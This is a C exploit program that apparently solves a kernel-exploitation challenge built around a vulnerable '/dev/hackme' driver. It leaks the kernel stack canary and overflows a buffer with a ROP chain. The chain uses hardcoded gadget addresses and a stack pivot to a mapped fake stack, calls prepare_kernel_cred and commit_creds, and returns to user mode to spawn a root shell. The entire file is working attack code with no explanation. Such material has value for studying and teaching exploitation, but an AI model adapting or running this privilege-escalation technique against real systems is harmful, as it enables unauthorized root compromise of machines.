#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/mman.h>

int g_fd = 0;

uint64_t g_canary;

void leak_canary() {
    char buf[0x100] = {0};
    read(g_fd, buf, 0x100);
    g_canary = *(uint64_t*)(buf+0x80);
    printf("[*] Kernel's canary=%lx\n", g_canary);
}

uint64_t user_ss, user_cs, user_sp, user_rflags;

void save_state() {
    __asm__ (
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] State Saved");
}

void get_shell() {
    if (0 != getuid()) {
        puts("[x] Not in root privilege.");
        exit(-1);
    } else {
        puts("[-] Success!!");
        system("/bin/sh");
    }
}

uint64_t user_pc = (uint64_t)get_shell;

void escalate_privs() {
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, 0xffffffff814c6410;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_pc;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void overflow() {
    uint64_t buf[50] = {0};
    size_t off = 16;
    uint64_t retaddr = (uint64_t)escalate_privs;
    // address of native_write_cr4()
    uint64_t ret2writeCR4 = 0xffffffff814443e0;
    uint64_t pop_rdi_ret = 0xffffffff81006370;

// 0xffffffff818c6ebb : cmp ecx, esi ; mov rdi, rax ; ja 0xffffffff818c6ead ; pop rbp ; ret
// 0xffffffff818c6f1d : cmp ecx, esi ; mov rdi, rax ; ja 0xffffffff818c6f0d ; pop rbp ; ret
// 0xffffffff818c6eba : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff818c6ead ; pop rbp ; ret
// 0xffffffff818c6f1c : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff818c6f0d ; pop rbp ; ret
// 0xffffffff8166fea3 : mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret
// 0xffffffff8166ff23 : mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret

    uint64_t mov_rdi_rax_pop_rbp_ret = 0xffffffff818c6ebb;

// 0xffffffff816f7287 : xor esi, esi ; ret
    uint64_t xor_esi_ret = 0xffffffff816f7287;

// 0xffffffff8141be81 : xor ecx, ecx ; ret
    uint64_t xor_ecx_ret = 0xffffffff8141be81;

    uint64_t ret2prepare_kernel_cred = 0xffffffff814c67f0;
    uint64_t ret2commit_creds = 0xffffffff814c6410;

// 0xffffffff8100a55f : swapgs ; pop rbp ; ret
    uint64_t swapgs_pop_rbp = 0xffffffff8100a55f;
    uint64_t iretq = 0xffffffff8100c0d9;

// 0xffffffff8196f56a : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
    uint64_t mov_esp_pop2_ret = 0xffffffff8196f56a;

    buf[off++] = g_canary;
    buf[off++] = 0; // rbx
    buf[off++] = 0; // r12
    buf[off++] = 0; // rbp
    buf[off++] = mov_esp_pop2_ret;

    buf[off++] = pop_rdi_ret;

    // ------ Stack Pivot ------
    // mmap to 0x5b000000
    uint64_t* fake_stack = (uint64_t*)(0x5b000000 - 0x1000);
    uint64_t*  p_fake_stack = (uint64_t*)mmap(fake_stack, 0x2000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (p_fake_stack != fake_stack) {
        puts("[x] Unable to map the fake stack.");
        exit(-1);
    }
    
    size_t fake_sp = 0x1000 / 8;

    p_fake_stack[0] = 0xdead; // !! puts something in the 1st page to prevent fault.

    p_fake_stack[fake_sp++] = 0; // dummy r12
    p_fake_stack[fake_sp++] = 0; // dummy rbp
    p_fake_stack[fake_sp++] = pop_rdi_ret;
    p_fake_stack[fake_sp++] = 0;
    p_fake_stack[fake_sp++] = ret2prepare_kernel_cred;
    p_fake_stack[fake_sp++] = xor_ecx_ret;
    p_fake_stack[fake_sp++] = xor_esi_ret;
    p_fake_stack[fake_sp++] = mov_rdi_rax_pop_rbp_ret;
    p_fake_stack[fake_sp++] = 0; // rbp
    p_fake_stack[fake_sp++] = ret2commit_creds;
    p_fake_stack[fake_sp++] = swapgs_pop_rbp;
    p_fake_stack[fake_sp++] = 0; // rbp
    p_fake_stack[fake_sp++] = iretq;
    p_fake_stack[fake_sp++] = user_pc;
    p_fake_stack[fake_sp++] = user_cs;
    p_fake_stack[fake_sp++] = user_rflags;
    p_fake_stack[fake_sp++] = user_sp;
    p_fake_stack[fake_sp++] = user_ss;

    puts("[*] Prepared payload.");
    write(g_fd, buf, sizeof(buf));
    puts("[!] Should never reach here!");
}

int main(int argc, char** argv) {
    g_fd = open("/dev/hackme", O_RDWR);
    if (g_fd < 0) {
        perror("open failed.");
        exit(-1);
    }
    save_state();
    leak_canary();
    overflow();
    // get_shell();
    return 0;
}